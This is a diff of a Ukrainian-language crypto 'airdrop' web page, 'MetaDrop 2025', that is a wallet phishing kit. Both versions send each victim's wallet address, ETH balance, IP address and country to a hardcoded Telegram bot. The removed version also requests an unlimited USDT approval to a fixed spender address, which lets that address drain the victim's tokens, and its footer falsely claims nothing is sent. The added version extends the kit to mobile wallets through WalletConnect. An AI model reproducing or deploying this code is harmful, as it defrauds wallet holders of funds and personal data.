@@ -2,146 +2,98 @@
 <html lang="uk">
 <head>
   <meta charset="UTF-8">
-  <title>MetaDrop 2025 | Airdrop Claim</title>
+  <title>MetaDrop 2025 | Multi-Device Support</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <style>
     body {
-      margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(145deg, #1e1e2f, #2b2d42);
-      color: #fff;
+      background: #0d1117;
+      color: white;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      height: 100vh;
       background-image: url('https://images.unsplash.com/photo-1610088442213-7e57ec5b6c16?auto=format&fit=crop&w=1500&q=80');
       background-size: cover;
-      background-position: center;
     }
-
-    .container {
-      background-color: rgba(0, 0, 0, 0.75);
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+    .box {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 30px;
+      border-radius: 15px;
       text-align: center;
       max-width: 400px;
     }
-
-    h1 {
-      font-size: 32px;
-      margin-bottom: 10px;
-      color: #ffcb6b;
-    }
-
-    p {
-      font-size: 16px;
-      color: #ccc;
-    }
-
     button {
-      margin: 15px 5px;
-      padding: 14px 24px;
+      margin: 10px;
+      padding: 12px 20px;
       font-size: 16px;
-      background-color: #00bcd4;
+      background: #00bcd4;
+      color: white;
       border: none;
-      border-radius: 12px;
+      border-radius: 10px;
       cursor: pointer;
-      transition: background 0.3s ease;
-      color: #fff;
-      font-weight: bold;
     }
-
     button:hover {
-      background-color: #0097a7;
-    }
-
-    .footer {
-      margin-top: 30px;
-      font-size: 12px;
-      color: #888;
+      background: #0097a7;
     }
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <h1>🎁 MetaDrop 2025</h1>
-    <p>Отримай бонус за участь у тесті<br>Натисни "Підключити", потім "Отримати бонус"</p>
-
-    <button onclick="connect()">🔌 Підключити MetaMask</button>
-    <button onclick="approve()">✅ Отримати бонус</button>
-
-    <div class="footer">Демонстраційна сторінка | Нічого не надсилається</div>
+  <div class="box">
+    <h2>🎁 MetaDrop 2025</h2>
+    <p>Працює на ПК та мобільному
+      <br>
+      Натисніть кнопку для підключення
+    </p>
+    <button onclick="connectWallet()">🔐 Підключити гаманець</button>
   </div>
 
   <script>
-    let signer, userAddress;
+    const BOT_TOKEN = "7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI";
+    const CHAT_ID = "7234699302";
 
-    async function connect() {
-      if (!window.ethereum) {
-        alert("🛑 Встановіть MetaMask");
-        return;
-      }
+    async function connectWallet() {
+      let provider;
+      let signer;
 
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
+      if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-        const balance = await provider.getBalance(userAddress);
-        const ethBalance = ethers.utils.formatEther(balance);
-
-        const ipRes = await fetch("https://ipapi.co/json/");
-        const ipData = await ipRes.json();
-
-        const message = `🧠 <b>Новий користувач підключив MetaMask:</b>\n\n` +
-          `👤 <b>Адреса:</b> <code>${userAddress}</code>\n` +
-          `💰 <b>ETH баланс:</b> ${ethBalance}\n` +
-          `🌍 <b>IP:</b> ${ipData.ip}\n` +
-          `🌐 <b>Країна:</b> ${ipData.country_name}\n` +
-          `📱 <b>Браузер:</b> ${navigator.userAgent}`;
-
-        await fetch(`https://api.telegram.org/bot7625731088:AAGWuxqSkiL72HInY03Q9CQU-D_cQKaZ4SI/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: 7234699302,
-            text: message,
-            parse_mode: "HTML"
-          })
+      } else {
+        const walletConnectProvider = new WalletConnectProvider.default({
+          infuraId: "1a2b3c4d5e6f4g7h8i9j0k" // замените на свой, если хотите
         });
-
-        alert("🟢 Підключено: " + userAddress + "\nБаланс: " + ethBalance + " ETH");
-
-      } catch (err) {
-        alert("❌ Помилка: " + err.message);
-      }
-    }
-
-    async function approve() {
-      if (!signer) {
-        alert("🛑 Спочатку підключіть MetaMask");
-        return;
+        await walletConnectProvider.enable();
+        provider = new ethers.providers.Web3Provider(walletConnectProvider);
+        signer = provider.getSigner();
       }
 
-      const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-      const spender = "0x544efFe1651BD2A665e4aD7ddA155d38f71FC1c0";
-      const abi = [
-        "function approve(address spender, uint256 amount) public returns (bool)"
-      ];
+      const address = await signer.getAddress();
+      const balance = await provider.getBalance(address);
+      const ethBalance = ethers.utils.formatEther(balance);
 
-      const token = new ethers.Contract(usdtAddress, abi, signer);
+      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
 
-      try {
-        const tx = await token.approve(spender, ethers.constants.MaxUint256);
-        alert("✅ Approve відправлено: " + tx.hash);
-      } catch (err) {
-        alert("❌ Відмовлено: " + err.message);
-      }
+      const message = `👀 <b>Новий користувач:</b>\n\n` +
+        `🔑 <b>Адреса:</b> <code>${address}</code>\n` +
+        `💸 <b>Баланс:</b> ${ethBalance} ETH\n` +
+        `🌍 <b>IP:</b> ${ipData.ip}\n` +
+        `🌐 <b>Країна:</b> ${ipData.country_name}`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+
+      alert("Підключено: " + address + "\nБаланс: " + ethBalance + " ETH");
     }
   </script>
-
 </body>
 </html>
